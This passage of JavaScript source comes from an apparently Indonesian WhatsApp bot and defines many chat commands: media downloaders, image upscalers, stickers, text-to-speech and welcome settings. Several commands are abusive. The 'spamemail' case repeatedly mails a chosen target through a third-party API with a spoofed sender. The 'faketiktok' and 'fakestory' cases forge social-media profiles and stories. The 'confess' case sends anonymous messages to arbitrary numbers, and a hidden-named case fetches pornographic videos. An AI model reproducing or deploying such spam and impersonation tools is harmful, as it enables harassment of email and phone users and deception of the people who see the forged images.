 m.reply('Error saat mengambil informasi channel YouTube')
 }
}
break
    
//=======================================================
    
/*
Case Spam Email
By Rafz
*/

case 'spamemail': {
if (!text) return m.reply(`Contoh Penggunaan:\n${prefix+command} example123@mail.com|Woy Byone Https|999\n\n*Isi pesan harus berisi 20 atau lebih karakter*`)
let splitText = text.split("|").map(t => t.trim());
const target = splitText[0];
const isipesan = splitText[1];
const jumlah = splitText[2];
const powered = `${botname2} POWERED BY ©${namaOwner}` //sesuaikan dengan sc
m.reply(`Proses Spam Ke email ${target} sebanyak ${jumlah} kali`)
try {
for (let i = 0; i < jumlah; i++){
await sleep(5000) // delay kirim pesannya 1000=1 detik
await fetch(`https://fastrestapis.fasturl.cloud/tool/sendmail?to=${encodeURIComponent (target)}&from=Random%40gmail.com&subject=${encodeURIComponent(powered)}&message=${encodeURIComponent(isipesan)}`)
}
m.reply(`Berhasil mengirim spam ${target} sebanyak ${jumlah} kali`)
} catch (error) {
console.log(error)
m.reply(`Eror saat mencoba mengirim spam: ${error}`)
}
}
break 

//=======================================================
    
case 'ㅤㅤㅤㅤㅤㅤ': {
if (!isCreator) return Reply("This feature is currently broken and will never be fixed.")
const api = `https://api.vreden.my.id/api/hentaivid`
const response = await fetch(api);
const json = await response.json();
if (!json.status) return m.reply('Failed to fetch data. User ID might be invalid.');
let data = json.result
 for (let i = 0; i < Math.min(data.length, 8); i++) {
let title = data[i].title
let vid = data[i].video_1
await Sky.sendMessage(m.chat,{video:{url:vid},mimetype:'video/mp4',caption:title},{quoted: m})
await sleep(500)
}
} 
break
    
//=======================================================
    
case 'iqc': {
if (!text) return Reply(`Masukkan Teksnya!\n*Contoh:*\n${prefix+command} hai`)
await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
  const providers = [
    "Telkomsel",
    "Indosat Ooredoo",
    "XL Axiata",
    "Tri",
    "Smartfren",
    "Axis",
    "By.U"
  ];

  function getRandomKartu(maxLen = 12) {
    const raw = providers[Math.floor(Math.random() * providers.length)];
    const name = raw.toUpperCase();

    if (name.length > maxLen) {
      return name.slice(0, maxLen) + "…"; // contoh: INDOSAT OORE...
    }
    return name;
  }

  const card = getRandomKartu();

  const timezones = ["Asia/Jakarta", "Asia/Makassar", "Asia/Jayapura"];
  const randomTz = timezones[Math.floor(Math.random() * timezones.length)];

  // Ambil waktu sesuai timezone acak
  const jam = new Date().toLocaleTimeString("id-ID", {
    timeZone: randomTz,
    hour: "2-digit",
    minute: "2-digit",
    hour12: false
  });

  const baterai = Math.floor(Math.random() * 100) + 1; // 1–100
  const signal = Math.floor(Math.random() * 4) + 1;   // 1–4

  const res = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(jam)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(card)}&batteryPercentage=${baterai}&signalStrength=${signal}`;

  await Sky.sendMessage(m.chat, { image: { url: res } }, { quoted: m });
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
}
break;
 
//=======================================================  
    
/*
*[ Fitur Fake Tiktok ]*
Req:+62 815-...
Type? Case
*Sumber case?* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*Code?*
*/

case 'faketiktok': case 'tiktokfake': case 'fakett':{
  if (!text) {
    return Sky.sendMessage(m.chat, {
      text: `*Fake TikTok Profile Generator*\n\n` +
            `Kirim perintah dengan format:\n` +
            `*${prefix + command}* Nama|Username|Followers|Following|Likes|Bio|Verified(true/false)|isFollow(true/false)|dark/light\n\n` +
            `Contoh:\n` +
            `*${prefix + command}* Apa Kek|Yubi|4020030|12|789000|Beginner in coding, but I love it! Follow me for more coding tips and tricks.|true|true|dark`
    }, { quoted: m });
  }
  let [name, username, followers, following, likes, bio, verified = 'true', isFollow = 'true', dark = 'true'] = text.split('|')
  if (!name || !username || !followers || !following || !likes || !bio) {
    return m.reply('Format salah.\nCoba ikuti contoh:\nNama|Username|Followers|Following|Likes|Bio|Verified|isFollow|Theme')
  }
  let ppUrl = await Sky.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg')
  let apiUrl = `https://flowfalcon.dpdns.org/imagecreator/faketiktok?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&pp=${encodeURIComponent(ppUrl)}&verified=${verified}&followers=${followers}&following=${following}&likes=${likes}&bio=${encodeURIComponent(bio)}&dark=${dark}&isFollow=${isFollow}`

  try {
const axios = require('axios');
    let { data } = await axios.get(apiUrl, { responseType: 'arraybuffer' })
    const buffer = Buffer.from(data)
    const FormData = (await import('form-data')).default
    const form = new FormData()
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', buffer, 'tiktokfake.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    if (!upres.data || !upres.data.includes('catbox')) return m.reply('Gagal upload gambar.')
    Sky.sendMessage(m.chat, {
      image: { url: upres.data }
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    m.reply('Terjadi kesalahan saat membuat gambar.')
  }
}
  break
    
//=======================================================
    case "info": {
await peraturan(m.chat)
}
break
    
//=======================================================
    
case 'playtess': {
  if (!text) return m.reply(example("alone alan walker"));
  try {
    await Sky.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });
    let search = await yts(`${text}`);
    if (!search || search.all.length === 0) return m.reply(`*Lagu tidak di temukan!*`);
    let { url, image, title, author, duration } = search.all[0];
    var anu = await ytdl.ytmp3(`${url}`);
    if (anu.status) {
      let urlMp3 = anu.download.url;
      await Sky.sendMessage(m.chat, {
        audio: { url: urlMp3 },
        mimetype: "audio/mpeg",
        contextInfo: {
          externalAdReply: {
            thumbnailUrl: `${image}`,
            title: `${title}`,
            body: `Author ${author.name} || Duration ${duration.timestamp}`,
            sourceUrl: `${url}`,
            renderLargerThumbnail: true,
            mediaType: 1,
          },
        },
        quoted: m,
      });
    } else {
      return m.reply("Error! Result Not Found");
    }
    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (err) {
    console.error(err);
    m.reply(`*Terjadi kesalahan!* \n${err.message || err}`);
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    await sleep(500);
    try {
      m.reply("Mencoba Menggunakan API Cadangan...");
      await Sky.sendMessage(m.chat, { react: { text: '🔂', key: m.key } });
      let search = await yts(`${text}`);
      if (!search || search.all.length === 0) return m.reply(`*Lagu tidak di temukan!*`);
      let { url, image, title, author, duration } = search.all[0];
      const api = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(url)}`;
      const response = await fetch(api);
      const json = await response.json();
      //let data = json.data; // Jika data adalah properti langsung dari json
      let urlMp3 = json.data.dl; // Jika url ada di dalam properti "dl" di dalam "data"
      await Sky.sendMessage(m.chat, {
        audio: { url: urlMp3 },
        mimetype: "audio/mpeg",
        contextInfo: {
          externalAdReply: {
            thumbnailUrl: `${image}`,
            title: `${title}`,
            body: `Author ${author.name} || Duration ${duration.timestamp}`,
            sourceUrl: `${url}`,
            renderLargerThumbnail: true,
            mediaType: 1,
          },
        },
        quoted: m,
      });
      await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (eror) {
      console.error(eror);
      m.reply(`Error:${eror}`);
      return await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
  }
}
break;

//=======================================================
    case 'hdt': {
  const fetch = require('node-fetch');
  const fs = require('fs');
  const {
    ImageUploadService
  } = require('node-upload-images');
  const service = new ImageUploadService('postimages.org');
  let fturl = '';
  let isFromUrl = false;
  const bufferApiList = [{
    url: `https://apidl.asepharyana.cloud/api/ai/remini?url={url}`,
    emoji: '🎨'
  }, {
    url: `https://api.ryzumi.vip/api/ai/remini?url={url}`,
    emoji: '✨'
  }, {
    url: `https://api.siputzx.my.id/api/iloveimg/upscale?image={url}`,
    emoji: '🖼️'
  }, {
    url: `https://vapis.my.id/api/remini?url={url}`,
    emoji: '🖌️'
  }, {
    url: `https://vapis.my.id/api/reminiv2?url={url}`,
    emoji: '🌀'
  }, {
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgenlarger?url={url}`,
    emoji: '⬆️'
  }, {
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgretouch?url={url}`,
    emoji: '🪄'
  }, {
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgrestore?url={url}`,
    emoji: '⏳'
  }, {
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgsharpen?url={url}`,
    emoji: '🔪'
  }, {
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgunblur?url={url}`,
    emoji: '👓'
  }, {
    url: `https://bk9.fun/tools/enhance?url={url}`,
    emoji: '🚀'
  }, {
    url: `https://velyn.biz.id/api/tools/remini?url={url}`,
    emoji: '🌟'
  }, {
    url: `https://fgsi1-restapi.hf.space/api/tools/restore?url={url}`,
    emoji: '🛠️'
  }, {
    url: `https://fgsi1-restapi.hf.space/api/tools/upscale?url={url}`,
    emoji: '📈'
  }, {
    url: `https://apis.davidcyriltech.my.id/remini?url={url}`,
    emoji: '💡'
  }, {
    url: `https://nirkyy.koyeb.app/api/v1/upscale?url={url}`,
    emoji: '🔍'
  }, ];

  // Fungsi untuk mengacak urutan array (Fisher-Yates shuffle)
  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  if (args[0]) {
    try {
      new URL(args[0]);
      fturl = args[0];
      isFromUrl = true;
      console.log("URL Gambar (dari argumen):", fturl);
    } catch (_) {}
  }

  if (!fturl && !m.quoted && !m.msg.imageMessage) {
    return m.reply("Kirim/reply gambar atau berikan URL gambar!");
  }

  await Sky.sendMessage(m.chat, {
    react: {
      text: '⏳',
      key: m.key
    }
  });

  try {
    if (!isFromUrl) {
      const mime = (qmsg.msg || qmsg).mimetype || '';

      if (!/image/.test(mime)) {
        return m.reply("Itu bukan gambar!");
      }

      const media = await Sky.downloadAndSaveMediaMessage(qmsg);
      console.log("Media berhasil diunduh:", media);
      let uploadResult;
      try {
        uploadResult = await service.uploadFromBinary(fs.readFileSync(media), 'temp.png');
        console.log("Hasil unggahan:", uploadResult);
        fturl = uploadResult ? uploadResult.directLink.toString() : '';
      } catch (uploadError) {
        console.error("Error saat mengunggah:", uploadError);
        fturl = ''; // Set fturl ke kosong jika unggah gagal
      }
      await fs.unlinkSync(media);
      console.log("URL Gambar (setelah unggah):", fturl);
    }

    console.log("URL Gambar (fturl) sebelum API loop:", fturl);

    shuffleArray(bufferApiList);
    let processed = false;

    for (let i = 0; i < bufferApiList.length; i++) {
      const api = bufferApiList[i];
      const apiUrlWithLink = api.url.replace('{url}', encodeURIComponent(fturl));
      console.log(`Mencoba API ${api.emoji}: ${apiUrlWithLink}`);
      try {
        await Sky.sendMessage(m.chat, {
          react: {
            text: api.emoji,
            key: m.key
          }
        });
        await sleep(1500);
        const response = await fetch(apiUrlWithLink);
        if (response.ok) {
          console.log(`API BERHASIL: ${api.url} - Status: ${response.status}`);
          const buffer = await response.arrayBuffer();
          await Sky.sendMessage(m.chat, {
            image: Buffer.from(buffer),
            caption: `Source (Buffer): ${api.url}`
          }, {
            quoted: m
          });
          await Sky.sendMessage(m.chat, {
            react: {
              text: '✅',
              key: m.key
            }
          });
          processed = true;
          console.log("Loop dihentikan setelah keberhasilan."); // Log saat loop dihentikan
          break; // Keluar dari loop setelah berhasil
        } else {
          console.warn(`API gagal: ${api.url} - Status: ${response.status}`);
          // Tidak perlu mengirim pesan gagal di sini, biarkan loop mencoba API lain
        }
      } catch (error) {
        console.error(`Error saat mencoba API ${api.url}:`, error);
        // Tidak perlu mengirim pesan gagal di sini, biarkan loop mencoba API lain
      }
    }

    if (!processed) {
      await Sky.sendMessage(m.chat, {
        react: {
          text: '❌',
          key: m.key
        }
      });
      return m.reply("Semua API buffer gagal memproses gambar.");
    }

  } catch (error) {
    console.error("Error utama dalam bot:", error);
    await Sky.sendMessage(m.chat, {
      react: {
        text: '❌',
        key: m.key
      }
    });
    return m.reply(`Terjadi kesalahan: ${error.message || error}`);
  }
}
break;


//=======================================================
    
case 'hdreq': {
  const fetch = require('node-fetch');
  const fs = require('fs');
  const {
    ImageUploadService
  } = require('node-upload-images');
  const service = new ImageUploadService('pixhost.to');
  let fturl = '';
  let isFromUrl = false;
  const bufferApiList = [{
    name: 'AsepHaryono',
    url: `https://apidl.asepharyana.cloud/api/ai/remini?url={url}`,
    emoji: '🎨'
  }, {
    name: 'Ryzumi',
    url: `https://api.ryzumi.vip/api/ai/remini?url={url}`,
    emoji: '✨'
  }, {
    name: 'SiputZx',
    url: `https://api.siputzx.my.id/api/iloveimg/upscale?image={url}`,
    emoji: '🖼️'
  }, {
    name: 'VapiS (Remini)',
    url: `https://vapis.my.id/api/remini?url={url}`,
    emoji: '🖌️'
  }, {
    name: 'VapiS (Remini v2)',
    url: `https://vapis.my.id/api/reminiv2?url={url}`,
    emoji: '🌀'
  }, {
    name: 'FastRestAPI (Enlarger)',
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgenlarger?url={url}`,
    emoji: '⬆️'
  }, {
    name: 'FastRestAPI (Retouch)',
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgretouch?url={url}`,
    emoji: '🪄'
  }, {
    name: 'FastRestAPI (Restore)',
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgrestore?url={url}`,
    emoji: '⏳'
  }, {
    name: 'FastRestAPI (Sharpen)',
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgsharpen?url={url}`,
    emoji: '🔪'
  }, {
    name: 'FastRestAPI (Unblur)',
    url: `https://fastrestapis.fasturl.cloud/aiimage/imgunblur?url={url}`,
    emoji: '👓'
  }, {
    name: 'BK9',
    url: `https://bk9.fun/tools/enhance?url={url}`,
    emoji: '🚀'
  }, {
    name: 'Velyn',
    url: `https://velyn.biz.id/api/tools/remini?url={url}`,
    emoji: '🌟'
  }, {
    name: 'FGSI1 (Restore)',
    url: `https://fgsi1-restapi.hf.space/api/tools/restore?url={url}`,
    emoji: '🛠️'
  }, {
    name: 'FGSI1 (Upscale)',
    url: `https://fgsi1-restapi.hf.space/api/tools/upscale?url={url}`,
    emoji: '📈'
  }, {
    name: 'DavidCyril',
    url: `https://apis.davidcyriltech.my.id/remini?url={url}`,
    emoji: '💡'
  }, {
    name: 'Nirkyy',
    url: `https://nirkyy.koyeb.app/api/v1/upscale?url={url}`,
    emoji: '🔍'
  }, ];

  if (args.length === 0) {
    let listApi = "Silakan pilih API yang ingin digunakan:\n";
    bufferApiList.forEach((api, index) => {
      listApi += `${index + 1}. ${api.name} (${api.emoji})\n`;
    });
    listApi += `\nContoh penggunaan:\n${prefix}${command} <nomor_api> [url_gambar] atau reply gambar dengan perintah\n\nContoh:\n${prefix}${command} 14 `;
    return m.reply(listApi);
  }

  const selectedApiIndex = parseInt(args[0]) - 1;

  if (isNaN(selectedApiIndex) || selectedApiIndex < 0 || selectedApiIndex >= bufferApiList.length) {
    return m.reply(`Nomor API tidak valid. Silakan gunakan ${prefix}${command} untuk melihat daftar API dan contoh penggunaan.`);
  }

  const selectedApi = bufferApiList[selectedApiIndex];

  if (args[1]) {
    try {
      new URL(args[1]);
      fturl = encodeURIComponent(args[1]); // Encode URL dari argumen
      isFromUrl = true;
      console.log("URL Gambar (dari argumen):", fturl);
    } catch (_) {}
  } else if (m.quoted && m.quoted.imageMessage) {
    if (!/image/.test(mime)) return m.reply(`Kirim gambar atau URL gambar dengan perintah ${prefix}${command} <nomor_api> [url_gambar] atau reply gambar dengan perintah\n\nContoh:\n${prefix}${command} 14\n\n> Mana fotonya jirr`)
    const media = await Sky.downloadAndSaveMediaMessage(m.quoted);
    const {
      directLink
    } = await service.uploadFromBinary(fs.readFileSync(media), 'temp.png');
    fturl = encodeURIComponent(directLink.toString()); // Encode URL dari unggahan
    await fs.unlinkSync(media);
    isFromUrl = true;
    console.log("URL Gambar (dari reply):", fturl);
  } else if (m.msg.imageMessage) {
    const mime = (await Sky.getFile(m)).mimetype || '';
    if (!/image/.test(mime)) {
      return m.reply("Itu bukan gambar!");
    }
      await Sky.sendMessage(m.chat, {
        react: {
          text: '🕒',
          key: m.key
        }
      })
    const media = await Sky.downloadAndSaveMediaMessage(m);
    const {
      directLink
    } = await service.uploadFromBinary(fs.readFileSync(media), 'temp.png');
    fturl = encodeURIComponent(directLink.toString()); // Encode URL dari unggahan
    await fs.unlinkSync(media);
    isFromUrl = true;
    console.log("URL Gambar (dari caption):", fturl);
  } else {
    return m.reply(`Kirim gambar atau URL gambar dengan perintah ${prefix}${command} <nomor_api> [url_gambar] atau reply gambar dengan perintah\n\nContoh:\n${prefix}${command} 14`);
  }

  await Sky.sendMessage(m.chat, {
    react: {
      text: selectedApi.emoji,
      key: m.key
    }
  });

  try {
    const apiUrlWithLink = selectedApi.url.replace('{url}', fturl); // Gunakan fturl yang sudah di-encode
    console.log(`Menggunakan API: ${selectedApi.name} - URL: ${apiUrlWithLink}`);
    const response = await fetch(apiUrlWithLink);
    if (response.ok) {
      const buffer = await response.arrayBuffer();
      await Sky.sendMessage(m.chat, {
        image: Buffer.from(buffer),
        caption: `Diproses menggunakan: ${selectedApi.name}`
      }, {
        quoted: m
      });
      await Sky.sendMessage(m.chat, {
        react: {
          text: '✅',
          key: m.key
        }
      });
    } else {
      console.warn(`API ${selectedApi.name} gagal: ${response.status}`);
      await Sky.sendMessage(m.chat, {
        react: {
          text: '❌',
          key: m.key
        }
      });
      return m.reply(`API ${selectedApi.name} gagal memproses gambar.`);
    }
  } catch (error) {
    console.error(`Error saat menggunakan API ${selectedApi.name}:`, error);
    await Sky.sendMessage(m.chat, {
      react: {
        text: '❌',
        key: m.key
      }
    });
    return m.reply(`Terjadi kesalahan saat menggunakan API ${selectedApi.name}.`);
  }
}
break;

//=======================================================

case 'fakestory': {
  try {
    const { createCanvas, loadImage } = require('canvas')
    await Sky.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let [username, caption] = text.split('|')
    if (!username || !caption) return m.reply(`Contoh:\n.${command} Yubi|Eummm...`)
    const bgUrl = 'https://files.catbox.moe/3gwr1l.jpg'
    const bg = await loadImage(bgUrl)
    const userPP = await Sky.profilePictureUrl(m.sender, 'image').catch(_ => 'https://img1.pixhost.to/images/5831/600387261_biyu-offc.jpg')
    const pp = await loadImage(userPP)
    const canvas = createCanvas(720, 1280)
    const ctx = canvas.getContext('2d')
    ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
    const ppX = 40
    const ppY = 250
    const ppSize = 70
    ctx.save()
    ctx.beginPath()
    ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
    ctx.closePath()
    ctx.clip()
    ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
    ctx.restore()
    ctx.font = '28px Arial'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'left'
    ctx.textBaseline = 'middle'
    const usernameX = ppX + ppSize + 15
    const usernameY = ppY + ppSize / 2
    ctx.fillText(username, usernameX, usernameY)
    ctx.font = 'bold 30px Arial'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'center'
    ctx.textBaseline = 'top'
    const captionX = canvas.width / 2
    const captionY = canvas.height - 650
    const maxWidth = canvas.width - 100
    const lineHeight = 42
    wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight)
    let buffer = canvas.toBuffer()
    await Sky.sendMessage(m.chat, {
      image: buffer,
      caption: 'Sukses Kak :v'
    }, { quoted: m })
  } catch (e) {
    m.reply(`❌ Error\nLogs error : ${e.message}`)
  }
  function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
    let line = ''
    for (let i = 0; i < text.length; i++) {
      let testLine = line + text[i]
      let testWidth = ctx.measureText(testLine).width
      if (testWidth > maxWidth && line !== '') {
        ctx.fillText(line, x, y)
        line = text[i]
        y += lineHeight
      } else {
        line = testLine
      }
    }
    if (line) ctx.fillText(line, x, y)
  }
}
break

//=======================================================

// case
case 'topcmd': {
const momento = require('moment')
  let logs = JSON.parse(fs.readFileSync(logPath))
  let todayStart = momento().startOf('day').valueOf()
  let todayLogs = logs.filter(log => log.time >= todayStart)
  let freq = {}
  for (let log of todayLogs) {
    freq[log.cmd] = (freq[log.cmd] || 0) + 1
  }
  let sorted = Object.entries(freq).sort((a, b) => b[1] - a[1])
  if (!sorted.length) return m.reply('Belum ada command yang digunakan hari ini.')
  let teks = '*Top 10 Command Hari Ini:*\n\n'
  sorted.slice(0, 10).forEach(([cmd, total], i) => {
    teks += `${i + 1}. *${cmd}* → ${total}x\n`
  })
  m.reply(teks)
}
break
    
//=======================================================
    
case "cswm": case "cstickerwm": case "cstikerwm": case "cwm": {
if (!await isRegister(m.sender)) return Reply(mess.register);
if (!text) return m.reply(example("packname|author dengan kirim/reply media"))
if (!/image|video/gi.test(mime)) return m.reply(example("packname|author dengan kirim/reply media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let splitText = text.split("|").map(t => t.trim());
const packname = splitText[0]
const author = splitText[1]
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: `${packname}`, author: `${author}`})
await fs.unlinkSync(image)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
  

//=======================================================
    
 /*

# Fitur : ctag (custom tag group)
# Type : case
# Created by : https://whatsapp.com/channel/0029Vb2qri6JkK72MIrI8F1Z
# Api : Local WA-only

   ⚠️ _Note_ ⚠️
jangan hapus wm ini banggg

*/

case 'ctag': 
case 'customtag': {
  try {
    if (!text.includes('|')) return m.reply('Contoh: .ctag 628xxxxxx|cukiiiiiiiiiiiii')

    let [nomor, isiTag] = text.split('|')
    nomor = nomor.replace(/\D/g, '')
    if (!nomor) return m.reply('Nomor tidak valid!')
    if (!isiTag) return m.reply('Teks tag tidak boleh kosong!')

    let jid = [`${nomor}@s.whatsapp.net`]

    await Sky.sendMessage(m.chat, {
      text: `@${m.chat}`,
      contextInfo: {
        mentionedJid: jid,
        groupMentions: [
          {
            groupSubject: isiTag,
            groupJid: m.chat,
          },
        ],
      },
    })
  } catch (e) {
    m.reply(`❌ Error\nLogs error : ${e.message || e}`)
  }
}
break
    
//=======================================================
   
/*
Fitur tts (text-to-speech)
Sumber fitur asli: SC Biyu Botz 2.0
Di modif oleh: Rafz
*/
case 'tts': {

  if (!text) return m.reply(example("aku suka makan ramen"));
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
const API_BASE_URL = 'https://flowfalcon.dpdns.org/tools/text-to-speech';

  try {
    const res = await fetch(`${API_BASE_URL}?text=${encodeURIComponent(text)}`);
    const json = await res.json();

    if (!json.status || !json.result || !Array.isArray(json.result) || json.result.length === 0) {
      return m.reply('Gagal generate suara atau tidak ada suara yang ditemukan.');
    }

    let allButtons = [];

    for (const voice of json.result) {
      const name = voice.voice_name;
      const url = Object.values(voice).find(v => typeof v === 'string' && v.startsWith('https'));

      if (url) {
        allButtons.push({
          buttonId: `.getaudio ${url}`,
          buttonText: { displayText: `Voice: ${name}`},
          type: 1
        });
      }
    }

    if (allButtons.length === 0) {
        return m.reply('Tidak ada suara yang valid ditemukan untuk dibuatkan tombol.');
    }

    const buttonMessage = {
        text: `Pilih jenis suara untuk "${text}":`,
        footer: "Klik tombol di bawah untuk mendengarkan suara.",
        buttons: allButtons,
        headerType: 1,
        viewOnce: true
    };

    await Sky.sendMessage(m.chat, buttonMessage, { quoted: m });

  } catch (err) {
    console.error(err);
    m.reply('Terjadi kesalahan saat memproses audio.');
  }
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break;

//=======================================================
   
case 'tag' : {
const number = text.replace(/[^0-9]/g, "");
const user = number + '@s.whatsapp.net';
m.reply(`@${user.split('@')[0]}`)
}
break

//=======================================================
    
case "getaudio": case "gtmp3": {
try {
if (!text) return m.reply(example("https://example.com"))
Sky.sendMessage(m.chat, {audio: {url: `${text}`}, mimetype: 'audio/mpeg'}, { quoted : m })
} catch (e) {
console.error(e)
m.reply(`Failed to download video because:${e}`)
}
}
break
 
//=======================================================
    
case 'confees': case 'confess': {
if (!await isRegister(m.sender)) return Reply(mess.register)
if (m.isGroup) return Reply(mess.private)
if (!text.includes("|")) return m.reply(`Cara penggunaan:\n${prefix+command} teks|from|to\n\nContoh:\n${prefix+command} Mabar yok|Rafz|+628xxxxx`)
let batas = text.split("|").map(t => t.trim());
const isi = batas[0];
const from = batas[1];
const to = batas[2];
const target = to.replace(/[^0-9]/g, "");
const user_target = target + '@s.whatsapp.net';
const from_number = m.chat.replace(/[^0-9]/g, "");
const user_from_number = from_number + '@s.whatsapp.net';
const nasipadang = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Hai ${user_target.split('@')[0]}\nAda pesan confees Nihh`}}}
const mieayam = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Berhasil Terkirim!`}}}
const teksnya = `Hallo kak kami dengan ${botname}, ada pesan nih untuk kakak.

*Pengirim:* ${from}
*Pesan:* ${isi}
*Nomor yang di tuju:* ${user_from_number.split('@')[0]}
> Jangan salahkan bot jika pesan berisi kata-kata tidak sopan.\n> Jika anda tidak mengenal pengirimnya harap abaikan saja pesan ini.`
const teksnyafrom = `Pesan Conffes berhasil di kirim ke ${user_target.split('@')[0]} dengan isi:\n${isi}`
await Sky.sendMessage(target + "@s.whatsapp.net", {text: teksnya}, {quoted: nasipadang});
await Sky.sendMessage(m.chat,{text: teksnyafrom},{quoted: mieayam})
}
break
    
//=======================================================
    
case "ytmp4v2":
case "ytvideo-v2": {
    if (!text) return m.reply(`Example: ${prefix + command} https://youtube.com/watch?v=CVLeZpg6Kzk 144/240/360/480/720/1080`);

    const argsc = text.split(" ").map(t => t.trim());
    const url = argsc[0];
    const availableResolutions = ['144', '240', '360', '480', '720', '1080'];
    let qualitys = argsc[1] && availableResolutions.includes(argsc[1]) ? argsc[1] : '480';

    // Update regex to include YouTube Shorts URLs
    const youtubeUrlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([a-zA-Z0-9_-]{11})(?:\S+)?$/;

    if (!url.match(youtubeUrlRegex)) {
        return m.reply(`Harap berikan URL YouTube yang valid.\n\n Resolusi yang tersedia: ${availableResolutions.join(', ')}`);
    }

    await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
    try {
        const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${qualitys}`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data.status || !data.result) {
            return m.reply('Gagal mengunduh video. Mungkin video tidak tersedia atau API mengalami masalah.');
        }

        const { title, duration, cover, download, quality: downloadedQuality } = data.result;

        await Sky.sendMessage(m.chat, {
            video: { url: download },
            mimetype: "video/mp4",
            contextInfo: {
                externalAdReply: {
                    thumbnailUrl: cover,
                    title: `*${title}*`,
                    body: `Quality: *${downloadedQuality}p* || Duration ${duration}`,
                    sourceUrl: `${url}`,
                    renderLargerThumbnail: true,
                    mediaType: 1
                }
            }
        }, { quoted: m });
  await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    } catch (error) {
        console.error('Terjadi eror saat mengunduh video YouTube :', error);
        m.reply('Terjadi kesalahan saat mengunduh video. Coba lagi nanti.');
        await Sky.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
    }
}
break;
 

//=======================================================
    
// Inside your switch (command) block:

case 'setsambutan': {
    if (!isOwner) return m.reply('Perintah ini hanya untuk Owner.');
    if (!text) return m.reply(`Format salah. Gunakan:\n\n${prefix+command} [type] [on/off/pesan]\n\nContoh:\n${prefix+command} new_user on\n${prefix+command} new_user Halo {nama}, selamat datang!\n${prefix+command} new_user_days 30 (untuk mengubah hari tidak aktif)\n${prefix+command} weekend on/off/pesan (jika fitur weekend ada)\n${prefix+command} global on/off/pesan (jika fitur global ada)`);

    const args = text.split(' ');
    const type = args[0].toLowerCase();

    let updated = false;

    // Logika untuk Sambutan Pengguna Baru/Tidak Aktif
    if (type === 'new_user') {
        if (args[1] === 'on') {
            welcomeSettings.new_user.enabled = true;
            m.reply('Sambutan pengguna baru/tidak aktif diaktifkan.');
            updated = true;
        } else if (args[1] === 'off') {
            welcomeSettings.new_user.enabled = false;
            m.reply('Sambutan pengguna baru/tidak aktif dinonaktifkan.');
            updated = true;
        } else {
            const newMessage = args.slice(1).join(' ');
            if (newMessage) {
                welcomeSettings.new_user.message = newMessage;
                m.reply(`Pesan sambutan pengguna baru/tidak aktif diatur menjadi:\n"${newMessage}"`);
                updated = true;
            } else {
                m.reply('Pesan tidak boleh kosong.');
            }
        }
    } else if (type === 'new_user_days') {
        const days = parseInt(args[1]);
        if (!isNaN(days) && days > 0) {
            welcomeSettings.new_user.days_inactive = days;
            m.reply(`Batas hari tidak aktif untuk sambutan pengguna baru diatur menjadi ${days} hari.`);
            updated = true;
        } else {
            m.reply('Jumlah hari tidak aktif harus berupa angka positif.');
        }
    }
    // Logika untuk Weekend Welcome (jika Anda menggunakannya)
    else if (type === 'weekend') {
        if (args[1] === 'on') {
            welcomeSettings.weekend.enabled = true;
            m.reply('Sambutan akhir pekan diaktifkan.');
            updated = true;
        } else if (args[1] === 'off') {
            welcomeSettings.weekend.enabled = false;
